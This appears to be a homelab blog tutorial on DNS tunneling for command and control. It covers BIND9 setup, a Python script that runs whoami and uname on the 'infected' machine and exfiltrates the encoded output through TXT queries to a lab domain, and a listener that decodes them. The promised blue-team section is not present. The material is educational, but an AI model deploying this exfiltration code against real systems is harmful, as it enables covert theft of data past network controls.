---
title: DNS Tunneling
date: 2025-06-11
draft: false
author: Alex Jenkins
---
| Category      | ID        | Description       |
| ------------- | --------- | ----------------- |
| Tactic        | TA011     | Command and Control |
| Technique     | T1071     | Application Layer Protocol  |
| Sub-Technique | T1071.004 | Application Layer Protocol: DNS |
# Introduction
The Domain Name System (DNS) is a common Application Layer protocol that communicates over port 53. Many organisations will allow traffic over this protocol because it is essential for translating domain named into IP addresses. Adversaries may use this to their advantage and communicate with their Command and Control (C2) servers over this commonly-used protocol, blending in with normal traffic - AKA DNS tunneling.  

In today's lab I will be demonstrating my own take on this issue, showcasing one way in which an adversary may exfiltrate data using DNS queries. It begins by explaining how to configure both the infected machine and DNS server, complete with scripts used during red team engagements to both encode and transmit data, and a blue team investigation with detection and remediation strategies.

* Please note that this is for educational purposes only. Using these techniques outside of controlled environments may violate policy or law.

# Configuration
For this configuration I am using Ubuntu Server 24.04.2 LTS for my C2 server and Arch Linux for the infected machine. You don't need to use Arch for your host, you can use whatever Linux OS you want. Ubuntu Server is recommended because it's what I've used for this lab and it has nice easy-to-use DNS software ready to install from the package repository. Go ahead and set those two machines up then continue reading.

### Server
First of all, make sure you download bind9 and dnsutils. bind9 is what we will be using as the name server, and dnsutils gives us some common DNS troubleshooting tools like nslookup. Install these with the following command:
```
sudo apt-get install bind9 dnsutils
```

I will be covering all the steps required to get this up and running, but I would encourage you to read [Ubuntu's Tutorial](https://documentation.ubuntu.com/server/how-to/networking/install-dns/index.html) on setting up a DNS server because it's much more comprehensive than mine. It's also a very good place to start if you're a beginner and have never setup a DNS server before.

To setup the forward lookup zone you need to modify `/etc/bind/named.conf.local`. You'll change this to use whatever FQDN you want, I've gone with the very creative homelab.local, then list it as type master and point it to your new file. This tells BIND9 where to look for your forward zone configurations.
```
zone "homelab.local" {
  type master;
  file "/etc/bind/db.homelab.local";
};
```

The next logical step should then be to make the fowards zone file. To do that just copy an existing zone file as a template for editing, matching the file path you used in `named.conf.local`.
```
sudo cp /etc/bind/db.local /etc/bind/db.homelab.local
```

Now you want to open that file in a text editor and make some changes. You can copy my file, just make sure you change it to reflect the correct domain and IP address for your nameserver.  
Important: The serial number needs to be incremented any time you make a change to this file.
```
;
; BIND data file for local loopback interface
;
$TTL    604800
@       IN      SOA     homelab.local. root.homelab.local. (
                              2         ; Serial
                         604800         ; Refresh
                          86400         ; Retry
                        2419200         ; Expire
                         604800 )       ; Negative Cache TTL
;
@       IN      NS      homelab.local.
@       IN      A       192.168.1.155      
```

That's all you need to do to make a working DNS, but we need to go one step further and enable logging. Enabling logs will allow us to capture queries from the infected machine and save them for processing. This file doesn't have any system-specific content so feel free to just copy and paste it if you want. Make these changes to `/etc/bind/named.conf`.
```
include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

logging {
        channel query.log {
                file "/var/log/named/query.log";
        };
        category queries { query.log; };
};
```

Sweet. Just the final touches now. Run these commands to make the new directory for the logs to live in, change the ownership to bind (the user which the **named daemon** runs as), restart the service to apply any changes, and start listening for logs.
```
sudo mkdir /var/log/named
sudo chown bind:bind /var/log/named
sudo systemctl restart bind9
sudo tail -f /var/log/named/query.log
```

Now test it on another machine with **nslookup** and you should see some acitivity in the log file. I've included snippets of output for both the client and server below:
```
Client
---
[alex@extarch c2-projects]$ nslookup homelab.local
Server:		192.168.1.155
Address:	192.168.1.155#53

Name:	homelab.local
Address: 192.168.1.155
```

```
Server
---
client @0x77042c1ca578 192.168.1.182#36083 (homelab.local): query: homelab.local IN A + (192.168.1.155)
client @0x77042c1ca578 192.168.1.182#35547 (homelab.local): query: homelab.local IN AAAA + (192.168.1.155)
```

### Infected Machine
On the infected machine modify `/etc/resolv.conf` to include:
```
nameserver 192.168.1.155 # Change this to the IP of your DNS server
```
This simulates real-world DNS connection. In doing this you can keep it isolated to your private network, allowing the infected machine to treat your server as its own DNS - enabling IP resolution. In real-world scenarios this wouldn't be required because the domain would be recognised by a public DNS provider.

# Red Team
``` python
def base64_encode(data):
    # base64 encoding requires input data as bytes
    if not isinstance(data, bytes):
       data = data.encode("utf-8")
    data = base64.b64encode(data)
    return data.decode("utf-8").strip()

def run_command(commands):
    # process commands and return stdout as bytes
    return subprocess.run(commands, capture_output=True).stdout

# Reconnaissance
import subprocess
raw_username = run_command("whoami")
raw_system_info = run_command(["uname", "-r"])

# Encoding
import base64
encoded_username = base64_encode(raw_username)
encoded_system_info = base64_encode(raw_system_info)

# Exfiltration
import dns.resolver
domain = ".homelab.local"
encoded_message = f"{encoded_username}.{encoded_system_info}" + domain
try:
    dns.resolver.resolve(encoded_message, 'TXT')
except:
    pass
```

When running the script you should get output like below:
```
client @0x77042c1ca578 192.168.1.182#55499 (YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local): query: YWxleAo=.Ni4xNC4xMC1hcmNoMS0xCg==.homelab.local IN TXT +E(0) (192.168.1.155)
```

Now that we've confirmed that works it's time to make a python script on the server to strip out the query and decode it.
``` python
import re
import time
import base64

dns_log_file = "/var/log/named/query.log"

with open(dns_log_file, "r") as file:
    file.seek(0,2) # move to end of file
    while True:
        message = []
        line = file.readline()
        if line:
            line = line.strip()
            match = re.search(r'query: ([^\s]+)', line)
            if match:
                query = match.group(1)
                split_query = query.split('.')
                for section in split_query:
                    if section == "homelab" or section == "local":
                        pass
                    else:
                        decoded_section = base64.b64decode(section).decode("utf-8").strip()
                        message.append(decoded_section)
        if message:
            print(" ".join(message))
        time.sleep(1)
```

The program above is designed to listen to the DNS log file for any updates, refreshing every second. I've named it dns_listener.py. You should notice that this is a very basic example and isn't very fault-tolerant. It will quickly strip out the query within the DNS record, split that query into sections by periods, and decode those sections if they don't match one of two keywords; homelab and local. Make sure to adapt those keywords to fit your setup if you're following along or you will have errors.

The malware on the infected machine will gather user and system information relevant to your setup. That said, if all steps were followed correctly, the listener should have successfully decoded the DNS query and will output the infected machine's details. Example output from my machine:
```
alex@c2-server:~$ python3 dns_listener.py 
alex 6.14.10-arch1-1
```

With that you've had a basic example of how a threat actor might exfiltrate data via the DNS protocol. The example I've given is the first step of communication, where the server has now received information which it can use to identify the infected machine. In future communications the infected machine could prefix messages with this information so that the C2 server may recognise the source of the data.
